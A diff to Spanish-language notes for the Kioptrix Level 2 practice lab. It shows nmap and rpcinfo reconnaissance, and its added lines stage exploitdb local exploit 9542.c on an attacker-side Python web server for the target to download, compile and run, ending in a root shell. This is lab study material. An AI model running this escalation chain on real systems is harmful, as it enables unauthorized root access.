@@ -1,9 +1,5 @@
 Kioptrix Level 2
 
-PROBAR
-exploits/linux/local/33321.c
-exploits/linux_x86/local/9542.c
-
 nmap -sn 192.168.111.0/24
 Encontramos la máquina en 192.168.111.130
 
@@ -105,3 +101,9 @@ rpcinfo -p 192.168.111.130
     100000    2   udp    111  portmapper
     100024    1   udp    629  status
     100024    1   tcp    632  status
+
+cp /usr/share/exploitdb/exploits/linux/local/9542.c ./
+sudo python -m SimpleHTTPServer 80
+Descargamos, compilamos y usamos 9542.c
+  sh-3.00# id
+    uid=0(root) gid=0(root) groups=48(apache)
